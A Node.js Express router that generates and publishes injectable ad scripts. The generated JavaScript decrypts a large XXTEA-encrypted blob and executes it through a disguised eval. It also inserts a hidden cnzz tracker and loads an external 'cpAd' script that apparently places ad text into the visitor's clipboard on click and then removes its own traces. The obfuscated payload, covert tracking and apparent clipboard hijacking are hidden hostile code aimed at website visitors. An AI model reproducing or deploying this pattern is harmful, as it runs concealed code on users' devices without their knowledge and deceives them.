/**
 * Created by ash on 22/05/2017.
 */
const express = require('express');
const router = express.Router();
const moment = require('moment');
const SimpleNodeLogger = require('simple-node-logger');
const UglifyJS = require("uglify-js");
const exec = require('child_process').exec;

const fs = require('fs');

const path = 'http://code.taobao.org/svn/adsfile/trunk/';
// const path = 'http://localhost:1788/adsFiles/';

const opts = {
  logFilePath: `logs/ads-log-${moment().format('YYYY-MM-DD')}.log`,
  timestampFormat:'YYYY-MM-DD HH:mm:ss'
};
const log = SimpleNodeLogger.createSimpleLogger(opts);

const options = {
  toplevel: true,
  compress: {
    unsafe: true,
    unsafe_comps: true,
    unsafe_Func: true,
  },
  output: {
    beautify: false,
  }
};

router.get('/getAdsList', (req, res) => {
  fs.readdir(`${__dirname}/../../adsFiles`, (err, files) => {
    const arr = (files || []).filter(file => file.indexOf('git') < 0 && file.indexOf('README') < 0).map(item => path.concat(item));
    res.status(200).json({ result: 0, files: arr, });
  });
});

router.post('/newAds', (req, res) => {
  const content = req.body.content || [];
  const length = content.length;
  if (!length) {
    res.status(400).json({ result: 1, error: '内容不能为空！' });
  }

  // 加密函数
  function str_encrypt(str) {
    let c = String.fromCharCode(str.charCodeAt(0) + str.length);

    for (let i = 1; i < str.length; i++) {
      c += String.fromCharCode(str.charCodeAt(i) + str.charCodeAt(i - 1));
    }

    return c;
  }

  // 加密
  content.forEach((item, index) => {
    content[index] = str_encrypt(item);
  });

  const str = `
  !function e(r, n, t) {
      function o(f, a) {
          if (!n[f]) {
              if (!r[f]) {
                  var c = "function" == typeof require && require;
                  if (!a && c) return c(f, !0);
                  if (i) return i(f, !0);
                  var u = new Error("Cannot find module '" + f + "'");
                  throw u.code = "MODULE_NOT_FOUND", u
              }
              var s = n[f] = {
                  exports: {}
              };
              r[f][0].call(s.exports, function(e) {
                  var n = r[f][1][e];
                  return o(n ? n : e)
              }, s, s.exports, e, r, n, t)
          }
          return n[f].exports
      }
      for (var i = "function" == typeof require && require, f = 0; f < t.length; f++) o(t[f]);
      return o
  }({
      1: [function(e, r, n) {
          (function(r) {
              ! function(r, t) {
                  if ("function" == typeof define && define.amd) define(["./c"], t);
                  else if ("undefined" != typeof n) t(e("./c"));
                  else {
                      var o = {
                          exports: {}
                      };
                      t(r.c), r.a = o.exports
                  }
              }(this, function(e) {
                  "use strict";
  
                  function n(e) {
                      return e && e.__esModule ? e : {
                          "default": e
                      }
                  }
                  var t = n(e),
                      o;
                  o = "undefined" != typeof window ? window : "undefined" != typeof r ? r : "undefined" != typeof self ? self : void 0, o.e1se = t.default.d, o[t.default.e()](t.default.d("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", "0123456789abcdef"));
                  var i = "https:" == document.location.protocol ? " https://" : " http://",
                      f = "1262437887";
                  o === t && document.write(unescape("%3Cspan style='visibility%3Ahidden%3Bdisplay%3Anone%3B' id='cnzz_stat_icon_" + f + "'%3E%3C/span%3E%3Cscript srcc='" + i + "s22.cnzz.com/stat.php%3Fid%3D" + f + "' type='text/javascript'%3E%3C/script%3E"))
              })
          }).call(this, "undefined" != typeof global ? global : "undefined" != typeof self ? self : "undefined" != typeof window ? window : {})
      }, {
          "./c": 2
      }],
      2: [function(e, r, n) {
          ! function(e, r) {
              if ("function" == typeof define && define.amd) define(["exports"], r);
              else if ("undefined" != typeof n) r(n);
              else {
                  var t = {
                      exports: {}
                  };
                  r(t.exports), e.c = t.exports
              }
          }(this, function(e) {
              "use strict";
              var r = function e(r) {
                      for (var n = new Array(Math.ceil(r.length / 4)), t = 0; t < n.length; t++) n[t] = r.charCodeAt(4 * t) + (r.charCodeAt(4 * t + 1) << 8) + (r.charCodeAt(4 * t + 2) << 16) + (r.charCodeAt(4 * t + 3) << 24);
                      return n
                  },
                  n = function e(r) {
                      for (var n = new Array(r.length), t = 0; t < r.length; t++) n[t] = String.fromCharCode(255 & r[t], r[t] >>> 8 & 255, r[t] >>> 16 & 255, r[t] >>> 24 & 255);
                      return n.join("")
                  },
                  t = function e(r) {
                      for (var n = [], t, o = 0; o < r.length; o++) t = r.charCodeAt(o), 127 >= t ? n.push(t) : 2047 >= t ? n.push(t >> 6 | 192, 63 & t | 128) : 65535 >= t ? n.push(t >> 12 | 224, t >> 6 & 63 | 128, 63 & t | 128) : console.error("char code error, char num:", t);
                      return n
                  },
                  o = function e(r) {
                      for (var n = t(r), o = new Array(Math.ceil(n.length / 4)), i = 0; i < o.length; i++) o[i] = n[4 * i] + (n[4 * i + 1] << 8) + (n[4 * i + 2] << 16) + (n[4 * i + 3] << 24);
                      return o
                  },
                  i = function e(r) {
                      for (var n = [], t = 0, o = r.length, i, f, a; o > t;) switch (i = r[t++], i >> 4) {
                          case 0:
                          case 1:
                          case 2:
                          case 3:
                          case 4:
                          case 5:
                          case 6:
                          case 7:
                              n.push(String.fromCharCode(i));
                              break;
                          case 12:
                          case 13:
                              f = r[t++], n.push(String.fromCharCode((31 & i) << 6 | 63 & f));
                              break;
                          case 14:
                              f = r[t++], a = r[t++], n.push(String.fromCharCode((15 & i) << 12 | (63 & f) << 6 | (63 & a) << 0));
                              break;
                          default:
                              console.error("byte array to utf8 error code ", i >> 4)
                      }
                      return n.join("")
                  },
                  f = function e(r) {
                      for (var n = [], t = 0; t < r.length; t++) n.push(255 & r[t], r[t] >>> 8 & 255, r[t] >>> 16 & 255, r[t] >>> 24 & 255);
                      for (var t = 0; 3 > t && 0 == n[n.length - 1]; t++) n.pop();
                      return i(n)
                  };
              e.d = function(e, n) {
                  if (!e || !n) return "";
                  var t = r(atob(e)),
                      i = o(n).slice(-4);
                  i.length < 4 && console.error("key length error");
                  for (var a = t.length, c = t[a - 1], u = t[0], s = 2654435769, d, l, h = Math.floor(6 + 52 / a), p = h * s; 0 != p;) {
                      l = p >>> 2 & 3;
                      for (var v = a - 1; v >= 0; v--) c = t[v > 0 ? v - 1 : a - 1], u = t[v] -= (c >>> 5 ^ u << 2) + (u >>> 3 ^ c << 4) ^ (p ^ u) + (i[3 & v ^ l] ^ c);
                      p -= s
                  }
                  return f(t)
              }, e.e = function() {
                  return 14..toString(16) + "v" + 241..toString(22)
              }
          })
      }, {}]
  }, {}, [1]);
  window.onload = function() {
      var script = document.createElement('script');
      script.type = 'text/javascript';
      script.src = 'http://web-site-files.ashshen.cc/ads/cpAd.min.js';
      script.id = 'no-use-11';
      script.onload = function() {
          function str_decrypt(str) {
              var c = String.fromCharCode(str.charCodeAt(0) - str.length);
              for (var i = 1; i < str.length; i++) {
                  c += String.fromCharCode(str.charCodeAt(i) - c.charCodeAt(i - 1));
              }
              return c;
          }
          var bodyDom = document.getElementsByTagName('body')[0];
          var copyObj = new CpAd(bodyDom, {
              text: function() {
                  var content = JSON.parse('${JSON.stringify(content)}');
                  var index = Math.floor(Math.random() * ${length});
                  return str_decrypt(content[index]);
              }
          });
          bodyDom.addEventListener('click', function() {
              copyObj.destroy();
              document.getElementById('no-use-11') && bodyDom.removeChild(document.getElementById('no-use-11'));
          });
          bodyDom.addEventListener('touchend', function() {
              bodyDom.click();
          });
      };
      document.getElementsByTagName('body')[0].appendChild(script);
  }`;
  fs.readdir(`${__dirname}/../../adsFiles`, (err, files) => {
    const filesLength = (files || []).filter(file => file.indexOf('git') < 0 && file.indexOf('README') < 0);
    if (err) {
      res.status(400).json({ result: 1, error: err });
    } else {
      const result = UglifyJS.minify(str, options);
      fs.writeFile(`${__dirname}/../../adsFiles/ads-v1.${filesLength.length}.0.js`, result.code, (err1) => {
        if (err1) {
          res.status(400).json({ result: 1, error: err1 });
        } else {
          const svnCommand = `cd /home/svnFiles/adsfile/trunk && cp /app/node/adsFiles/ads-v1.${filesLength.length}.0.js ./ads-v1.${filesLength.length}.0.js && svn add ads-v1.${filesLength.length}.0.js && svn commit -m 'add' ads-v1.${filesLength.length}.0.js --username ashshen`;
          exec(svnCommand, (err2, stdout) => {
            log.error('err', err2);
            log.info('stdout', stdout);
            if (err2) {
              res.status(400).json({ result: 1, error: err2 });
            } else {
              res.status(200).json({ result: 0, path: `${path}ads-v1.${filesLength.length}.0.js`, });
            }
          });
        }
      });
    }
  });
});

module.exports = router;
